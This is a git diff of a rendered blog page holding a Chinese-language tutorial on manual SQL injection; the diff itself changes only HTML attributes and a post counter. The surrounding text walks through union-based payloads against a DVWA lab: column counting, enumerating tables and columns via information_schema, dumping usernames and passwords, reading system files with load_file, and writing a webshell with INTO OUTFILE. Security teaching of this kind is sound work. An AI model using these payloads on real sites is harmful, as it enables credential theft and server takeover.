@@ -382,8 +382,8 @@
         <p>​    本文主要对手工方式sql注入进行介绍，包括sql注入的介绍和分类、sql注入中常用的关键字与敏感函数、经典的手工注入、利用sql注入进行文件的写入与读取等几部分。</p>
 <p>​    后续的sql注入系列文章还将对使用sqlmap进行sql注入以及进行sql注入过程常见的一些关键问题做阐述，可以参见后面的文章：</p>
 <ul>
-<li><a href="">sql注入——sqlmap6步注入法</a></li>
-<li><a href="">sql注入——通过sqlmap进行getshell常见的问题</a></li>
+<li><a href>sql注入——sqlmap6步注入法</a></li>
+<li><a href>sql注入——通过sqlmap进行getshell常见的问题</a></li>
 </ul>
 <h3 id="sql注入介绍与分类"><a href="#sql注入介绍与分类" class="headerlink" title="sql注入介绍与分类"></a>sql注入介绍与分类</h3><p>​    </p>
 <pre class="mermaid">graph LR
@@ -393,9 +393,9 @@ C-->D(布尔型盲注)
 C-->E(延时盲注)</pre>
 
 <p>​    常见的sql注入主要分从注入结果的展现形式上分为普通注入和盲注两大类。最简单也是最常见的就是普通话的sql注入了，这种注入方式进行注入有直观展示的结果进行结果展示，一般可以直接使用union语句进行联合查询获取信息上传文件等操作，后续在<a href="#经典手工注入流程">经典手工注入流程</a>中讲述的就是使用普通注入进行sql注入。</p>
-<p><img src="https://github.com/AnchoretY/images/blob/master/blog/一般mysql.png?raw=true" alt=""></p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/一般mysql.png?raw=true" alt></p>
 <p>​    另外一大类sql注入就是盲注，这种sql注入方式一般用于页面并没有对sql注入的查询结果直接进行返回，只能通过返回的一些其他信息判断注入的片段是否正确进行了执行。其中根据页面返回的布尔值(页面是否正确返回)进行sql注入称为<strong>布尔型盲注</strong>，根据页面返回时间的差异确定注入是否成功的sql注入称为<strong>延时盲注</strong>。下面是一个最常用延时注入的例子：</p>
-<p><img src="https://github.com/AnchoretY/images/blob/master/blog/延时注入.png?raw=true" alt=""></p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/延时注入.png?raw=true" alt></p>
 <p>在上面的例子中，再过个浏览器控制器的控制台中，可以看到该请求存在着10s左右的等待时间，也即是说明我们前面的进行拼遭的sql注入语句正确的进行了执行，因此可以判断该部分是一个可以进行利用的注入点。本文重点介绍一般的注入，关于盲注的具体使用将在后续的文章中进行介绍。</p>
 <h3 id="2-sql-注入中常用的关键字和系统表"><a href="#2-sql-注入中常用的关键字和系统表" class="headerlink" title="2.sql 注入中常用的关键字和系统表"></a>2.sql 注入中常用的关键字和系统表</h3><h4 id="sql注入中常用到的sql关键字"><a href="#sql注入中常用到的sql关键字" class="headerlink" title="sql注入中常用到的sql关键字"></a>sql注入中常用到的sql关键字</h4><div class="table-container">
 <table>
@@ -505,16 +505,16 @@ C-->E(延时盲注)</pre>
 <p>要进行列数测试要使用order by进行测试，不断增加后面的数字，直到出错为止。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x order by 8</span><br></pre></td></tr></table></figure>
 <p>下面为使用dvwa进行注入测试时的行数测试为例，当使用oder by 1和2时，页面正常显示</p>
-<p><img src="https://github.com/AnchoretY/images/blob/master/blog/列数测试.png?raw=true" alt=""></p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/列数测试.png?raw=true" alt></p>
 <p>当将数字升到3是，产生如下报错，因此我们可以知道该表中只有两行。</p>
-<p><img src="https://github.com/AnchoretY/images/blob/master/blog/列数测试2.png?raw=true" alt=""></p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/列数测试2.png?raw=true" alt></p>
 <h4 id="3-测试当前表中那些列有回显"><a href="#3-测试当前表中那些列有回显" class="headerlink" title="3.测试当前表中那些列有回显"></a>3.测试当前表中那些列有回显</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># and 1=2为了不展示本改进心跳查询的内容，只展示union进行联合查询的内容</span><br><span class="line"># 最后的#是为了闭合本来sql语句中后面的‘</span><br><span class="line">http://xxx/abc.php?id=x and 1=2 union select 1,2#</span><br></pre></td></tr></table></figure>
 <p>这里dvwa表中本身就只有两列数据全部在前台进行显示</p>
-<p><img src="https://github.com/AnchoretY/images/blob/master/blog/展示列测试.png?raw=true" alt=""></p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/展示列测试.png?raw=true" alt></p>
 <h4 id="4-查询数据库名称"><a href="#4-查询数据库名称" class="headerlink" title="4.查询数据库名称"></a>4.查询数据库名称</h4><p>​    查询当前数据库名称我们可以直接使用数据库内置函数database()进行获取，利用该函数进行当前数据库名称获取的典型注入代码如下所示:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这里将database函数卸载第二个参数位置处，将在第二个参数展示的位置进行展示。也可以写在第一个参数位置</span><br><span class="line">http://xxx/abc.php?id=x and 1=2 union select 1,database()#</span><br></pre></td></tr></table></figure>
 <p>​    这里获取到了mysql中存在着名为dvwa的数据库</p>
-<p><img src="https://github.com/AnchoretY/images/blob/master/blog/手工注入-数据库名称获取.png?raw=true" alt=""></p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/手工注入-数据库名称获取.png?raw=true" alt></p>
 <h4 id="5-数据表名获取"><a href="#5-数据表名获取" class="headerlink" title="5.数据表名获取"></a>5.数据表名获取</h4><p>​     表名获取利用系统自带数据中（mysql中的information_schema）中的tables表中的内容进行获取。tables表中常用的字段如下表所示：</p>
 <div class="table-container">
 <table>
@@ -541,7 +541,7 @@ C-->E(延时盲注)</pre>
 </div>
 <p>​    使用下面的语句进行表名探索：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x and 1=2 union select 1,table_name from information_schema.tables where table_schema=&apos;dvwa&apos;#</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/AnchoretY/images/blob/master/blog/手工注入-表名获取.png?raw=true" alt=""></p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/手工注入-表名获取.png?raw=true" alt></p>
 <h4 id="6-字段获取"><a href="#6-字段获取" class="headerlink" title="6.字段获取"></a>6.字段获取</h4><p>​    字段获取利用系统自带的数据库（mysql中的information_schema）中的columns表中内容进行获取。columns表中常用字段如下表所示：</p>
 <div class="table-container">
 <table>
@@ -573,14 +573,14 @@ C-->E(延时盲注)</pre>
 </div>
 <p>​    使用下面语完成对指定表中的字段名称进行探索：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x and 1=2 union select 1,column_name from information_schema.columns where table_schema=&apos;dvwa&apos; and table_name=&apos;users&apos;#</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/AnchoretY/images/blob/master/blog/手工注入-表中列名获取.png?raw=true" alt=""></p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/手工注入-表中列名获取.png?raw=true" alt></p>
 <p>​    从上面的例子中我们可以看到在users表中存在着User和Password两个字段保存着网站管理员的用户和密码，接下来就可以直接对这两列的内容进行获取了。</p>
 <h4 id="7-读取关键字段"><a href="#7-读取关键字段" class="headerlink" title="7.读取关键字段"></a>7.读取关键字段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x and 1=2 union select user,password from dvwa.users #</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/AnchoretY/images/blob/master/blog/手工注入——用户名密码获取.png?raw=true" alt=""></p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/手工注入——用户名密码获取.png?raw=true" alt></p>
 <h3 id="4-文件的写入读取"><a href="#4-文件的写入读取" class="headerlink" title="4.文件的写入读取"></a>4.文件的写入读取</h3><p>​    除了上面的基本的注入步骤外，找到注入点后还可以直接利用sql注入漏洞进行进一步的文件相关操作，可以直接通过sql注入实现对文件的读取与写入，利用文件的写入功能实现webshell的上传、系统用户名密码获取等功能。</p>
 <h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>​    在具有文件写入权限时常常可以直接使用进行文件读取，读取到文件后可以xxx</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=1&apos; and 1=2 union select laod_file(&apos;/etc/password&apos;) #</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap文件读取.png?raw=true" alt=""></p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap文件读取.png?raw=true" alt></p>
 <h4 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h4><p>​    在具有文件写入权限时可以使用文件读取命令写入小马文件，获取shell。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=1 and 1=2 union select ’小马文件内容‘into outfile '文件目录+文件名'</span><br></pre></td></tr></table></figure>
 
@@ -707,7 +707,7 @@ C-->E(延时盲注)</pre>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">128</span>
+                  <span class="site-state-item-count">129</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
